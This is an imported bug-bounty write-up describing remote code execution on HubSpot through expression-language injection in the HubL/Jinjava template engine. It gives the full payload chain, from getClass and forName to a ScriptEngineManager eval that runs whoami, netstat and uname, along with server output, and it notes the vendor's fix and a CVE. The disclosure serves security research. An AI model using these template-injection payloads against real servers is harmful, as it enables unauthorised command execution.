---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-07_rce-in-hubspot-with-el-injection-in-hubl.md
original_filename: 2018-12-07_rce-in-hubspot-with-el-injection-in-hubl.md
title: RCE in Hubspot with EL injection in HubL
category: documents
detected_topics:
- command-injection
- xss
- graphql
- api-security
tags:
- imported
- documents
- command-injection
- xss
- graphql
- api-security
language: en
raw_sha256: b1fde39d618c5795313c1db7b33ccd53cc36b555178a01332d02670ea56031f6
text_sha256: 61244a678d19272f4d6763740d4dc1c5776cc454aa3b696f5b30352fead7f4b8
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# RCE in Hubspot with EL injection in HubL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-07_rce-in-hubspot-with-el-injection-in-hubl.md
- Source Type: markdown
- Detected Topics: command-injection, xss, graphql, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `b1fde39d618c5795313c1db7b33ccd53cc36b555178a01332d02670ea56031f6`
- Text SHA256: `61244a678d19272f4d6763740d4dc1c5776cc454aa3b696f5b30352fead7f4b8`


## Content

---
title: "RCE in Hubspot with EL injection in HubL"
url: "https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html"
final_url: "https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html"
authors: ["Fyoorer (@ƒyoorer)"]
programs: ["HubSpot"]
bugs: ["RCE"]
publication_date: "2018-12-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5541
---

###  RCE in Hubspot with EL injection in HubL 

[ December 07, 2018  ](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html "permanent link")

This is the story of how I was able to get remote code execution on [Hubspot](https://www.hubspot.com/)'s servers by exploiting a vulnerability in [HubL expression language](https://designers.hubspot.com/docs/hubl/intro-to-hubl), which is used for creating templates and custom modules within the Hubspot CRM. I had absolutely no experience with these kinds of vulnerabilities before and it turned out to be a very interesting learning opportunity. In this post, I go through the process I followed while researching and how little pieces were connected together to achieve a much bigger goal.  

####  Getting started

While working on the Hubspot's bugbounty program, I came across a functionality which looked very interesting. Users can create custom designs for emails or blogs from the design manager and can use HubL expression language in their templates.

Because HubL is a markup language, I began with the payload {{7*7}} and got a nice '49' back which means the server was treating anything within two curly brackets as HubL code.  
  
Bear in mind, at this point I didn't know anything about expression languages or HubL so I decided to fuzz the input and see what template engine is being used at server side by following the method posted at PortSwigger [blog](https://portswigger.net/blog/server-side-template-injection)  

###  [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio7K-K9or0T9MeJe5-dkiOhbFTr-5tdOW3M_rWVXUD-nOllpAjY6gqGB43qHO3xCH1fNbqc7g8-yW-40grm2oPzYJO3ZPmUSgPQM4qlYEegEVfcm5rokgEJlJeNxh1UjiVwR9TxWYf79o/s400/template-identify.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio7K-K9or0T9MeJe5-dkiOhbFTr-5tdOW3M_rWVXUD-nOllpAjY6gqGB43qHO3xCH1fNbqc7g8-yW-40grm2oPzYJO3ZPmUSgPQM4qlYEegEVfcm5rokgEJlJeNxh1UjiVwR9TxWYf79o/s1600/template-identify.png)

  
Interestingly the output didn't follow any known pattern and I reached "Unknown" or "Not Vulnerable". Giving up after a few tries is lame, so I decided it was time to [RTFM](https://designers.hubspot.com/docs/hubl/hubl-module-syntax-and-parameters)!  
  
**HubL Intro:**  
  
This is a very high level intro to HubL expression language and I am by no means an expert. The following section contains just enough information to understand what was happening and how I exploited the bug.  
  
The following 3 types of delimiters are used to separate HubL and HTML within the module's code.  
  
{% %} - statement delimiters  
  
HubL statements are used to create editable modules, define conditional template logic, set up for loops, define variables, and more.

  

{{ }} - expression delimiters  
  
Anything between expression delimiters {{ }} will be evaluated by the templating engine, and thats what I was more interested in.  

  

{# #} - comment delimiters  
  
  

Anything between the {# #} will be commented out or ignored by the parser.  

  
Variables:  
  

There are some built in variables such as {{ account }}, {{ company_domain }}, {{ content }} etc which can be used within a module. The parser replaces these variables with their actual values at runtime. e.g. {{ company_domain }} will be replaced by Your Company's domain name. Users can also declare custom variables within statement {% %} blocks and these can be used within expression {{ }} blocks just like built-in variables.

  
Another interesting thing to note here is that the documentation says HubL is based on Jinja but as observed before, the output wasn't following normal Jinja pattern when evaluating the expressions.  
  
Let the hacking begin!  
For all below examples, the payload was submitted in template_source parameter in the POST request and its output was seen in output_html & html fields.  

####  [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_aRNJi4nkZa2OcSPtRVL986XgKgFTG0yzCL03BbGzI6FQJ9ZY5EueEUbhkqoYJvNFe1cxYzGUUcZIZsuwHxulPYNAKbTuHi3IB0fg9M5n18vqq6IoDgD8VuRem2HvoA7S8lQK72fUE8U/s320/response.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_aRNJi4nkZa2OcSPtRVL986XgKgFTG0yzCL03BbGzI6FQJ9ZY5EueEUbhkqoYJvNFe1cxYzGUUcZIZsuwHxulPYNAKbTuHi3IB0fg9M5n18vqq6IoDgD8VuRem2HvoA7S8lQK72fUE8U/s1600/response.png)

  
After trying most of the built in variable names, I stumbled upon an undocumented variable: "request" which returned an interesting string.  
  
Payload: {{ request }}

Output: com.hubspot.content.hubl.context.TemplateContextRequest@23548206  
  
Nice! This looks like the memory location of the 'request' object! And it also looked like Java from the naming convention. After some Google searches, I tried the following payloads to verify if its a Java based template engine:  
  
Convert a string to upper case -  
Payload: {{'a'.toUpperCase()}}  
Output: A  
  
Concatenate two characters -  
Payload: {{'a'.concat('b')}}  
Output: ab  
  
Awesome! This looked very promising. The template engine not only parses its own syntax, it also allows us to call built-in methods.  
  
**The Vulnerability**  
  
Trying to get the class of a character -  
Payload: {{'a'.getClass()}}  
Output: java.lang.String  
  
Excellent! Java is confirmed! The vulnerability here is that it was possible to call the getClass() method on any object.  
At this point I was sure this could be exploited to something bigger. But before shooting for the moon, I wanted to understand how expression language works so I started by gathering more information:  
  
Get class of the request object -  
Payload: {{request.getClass()}}  
Output: class com.hubspot.content.hubl.context.TemplateContextRequest  
  
Get declared methods of a class ( increment from 0 to any number to get all the methods)\-  
Payload: {{request.getClass().getDeclaredMethods()[0]}}  
Output: public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()  
  
At this point, I searched for "com.hubspot.content.hubl.context.TemplateContextRequest" and discovered the [Jinjava project on Github](https://github.com/HubSpot/jinjava/).  
Looking at the class declaration in the source, I was also able to call methods from the request class -  
Payload: {{request.isDebug()}}  
Output: false  
  
To take it a step further, I learnt that you can use the forName() and newInstance() methods to get an instance of a completely different class -  
  
Using string 'a' to get an instance of class sun.misc.Launcher -  
Payload: {{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}  
Output: sun.misc.Launcher@715537d4  
  
It is also possible to get a new object of the Jinjava class -  
Payload: {{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}  
Output: com.hubspot.jinjava.JinjavaConfig@78a56797  
  
It was also possible to call methods on the created object by combining the {% %} and {{ }} blocks -  
Payload: {% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}{{ji.render('{{1*2}}')}}  
Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method.  
In the next block, I called the render method on 'ji' with expression {{1*2}}.  
Output: 2  
Jinjava Inception!  
  
I now had enough understanding and was ready to get the coveted remote code execution. From what I'd read, that should be easy. Just create an object of java.lang.Runtime class and call the exec() method on it. So....  
Payload: {{'a'.getClass().forName('java.lang.Runtime').newInstance()}}  
Output: TemplateSyntaxException: java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.lang.Runtime with modifiers "private"  
  
Bummer! Looks like Runtime is blocked. To make sure I am not missing anything, I tried getting the declared methods of the Runtime class with getDeclaredMethods call and it worked fine, meaning that calling the newInstance() method on java.lang.Runtime class was not allowed.  
  
Knowing Java's history, I was pretty sure there will be another way.  
Time to find an alternative.  
First option: java.lang.System  
Payload: {{'a'.getClass().forName('java.lang.System').newInstance()}}  
Ouput: TemplateSyntaxException: java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.lang.System with modifiers "private"  
Arrggh... one more candidate lost.  
  
After frantic searches and asking around, I found this [gem](https://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html) of a blog which introduced to me to javax.script.ScriptEngineManager.  
  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance()}}  
Output: javax.script.ScriptEngineManager@727c1a89  
  
Amazing! So I got an object of ScriptEngineManager means RCE was on the horizon.  
But before that, I had to get to know my new friend [ScriptEngineManager](https://docs.oracle.com/javase/7/docs/api/javax/script/ScriptEngineManager.html).  
  
Find out what type javascript engine this is -  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript')}}  
Output: jdk.nashorn.api.scripting.NashornScriptEngine@7f97607a  
  
  

  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihkvKXi_EB2mpHhlFTxfLHDo4V8EV00pYw-OenTpGFKbBGxVrw9uUsv5appPt_vTzXt-ckCDPqF6MSaMpjvVRR4W_gDVh-OGnJksz3ySibGCQVREzpDWxohCgcq_Ognv6LiW11XmehB8o/s400/javascript.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihkvKXi_EB2mpHhlFTxfLHDo4V8EV00pYw-OenTpGFKbBGxVrw9uUsv5appPt_vTzXt-ckCDPqF6MSaMpjvVRR4W_gDVh-OGnJksz3ySibGCQVREzpDWxohCgcq_Ognv6LiW11XmehB8o/s1600/javascript.jpg)  
---  
A bounty writeup without a meme is not fun!  
  
Get the script context -  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').getContext()}}  
Output: jdk.nashorn.api.scripting.NashornScriptEngine@7f97607a  
  
Get language name -  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineFactories()[0].getLanguageName()}}  
Output: ECMAScript  
  
Get language version -  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineFactories()[0].getLanguageVersion()}}  
Output: ECMA - 262 Edition 5.1  
  
Now go for the kill.  
  
To get RCE using the ScriptEngineManager, you have to run the ever so useful "eval" method with some Java code thrown into it.  
After a lot of trial and errors, I finally got eval to work.  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}  
Output: xxx  
  
I successfully evaluated dynamic java code using ScriptEngineManager instance!  
Now I only need to substitute real code that will execute system commands and throw it into eval.  
  
After another trial and error session, I finally had some success -  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\\\"whoami\\\\\"); x.start()\")}}  
Output: java.lang.UNIXProcess@1e5f456e  
  
Woot! The output was a reference to a UNIXProcess object which means my command was successfully executed! I could have now ran a reverse shell command and obtained a shell but since I was able to see the output, I decided to push this a little more and get the command's output in response itself.  
  
Another frantic search session resulted with the discovery of [org.apache.commons.io.IOUtils](https://commons.apache.org/proper/commons-io/javadocs/api-2.5/org/apache/commons/io/IOUtils.html). This class provides static utility methods for input/output operations.  
  
My final payload was -  
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\\\"netstat\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}  
  
Output: See for yourselves!  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheIQLUkA3JiJ3CMfMd5kc-ozhqoz6mYFXlwKt_RnVcWm3J-HhU5q0hM1r1btKyi-a3labx-mblxpaAxFNEc3CyfGaXVSHkSu6pteuyeucaH1nJoNxd3O5TBiLDfgKqNi0R1ff-_zC9kiw/s640/netstat-output.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheIQLUkA3JiJ3CMfMd5kc-ozhqoz6mYFXlwKt_RnVcWm3J-HhU5q0hM1r1btKyi-a3labx-mblxpaAxFNEc3CyfGaXVSHkSu6pteuyeucaH1nJoNxd3O5TBiLDfgKqNi0R1ff-_zC9kiw/s1600/netstat-output.png)  
---  
Bingpot!  
  
  

It took me a few more tries to learn how to pass multiple arguments to the commands.  
Notice the x.command function! -  
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\\\"uname\\\\\",\\\\\"-a\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}  
Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n  
  
As you can imagine, it was quite a struggle but in the end I had a lot of fun and learnt a lot in the process. The Jinjava project was introduced by Hubspot back in [2014](https://product.hubspot.com/blog/jinjava-a-jinja-for-your-java), that means this bug had been around 4 years in nobody found it (hopefully). The Hubspot team was very receptive and fixed it very fast by disabling the "getClass" method on a variable. You can find the fix [here](https://github.com/HubSpot/jinjava/pull/230).  
  
**Bonus**  
  
A couple of days after fixing the vulnerability, Hubspot informed me that since "[Jinjava](https://github.com/HubSpot/jinjava)" - an open source project - is being used by many other companies apart from Hubspot, they have applied for a CVE and I will be credited in it for the discovery of this issue! Sweet!

  
References:  
1\. <https://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html>  
2\. <https://portswigger.net/blog/server-side-template-injection>  
3\. <http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/>  
4\. [https://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html ](https://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html)  
  

Share 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Labels

[bugbounty](https://www.betterhacker.com/search/label/bugbounty) [EL injection](https://www.betterhacker.com/search/label/EL%20injection) [rce](https://www.betterhacker.com/search/label/rce)

Labels: [bugbounty](https://www.betterhacker.com/search/label/bugbounty) [EL injection](https://www.betterhacker.com/search/label/EL%20injection) [rce](https://www.betterhacker.com/search/label/rce)

Share 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

#### Post a Comment

[](https://www.blogger.com/comment/frame/4538251661335272060?po=6234996068590016082&hl=en&saa=85391&origin=https://www.betterhacker.com&skin=notable)
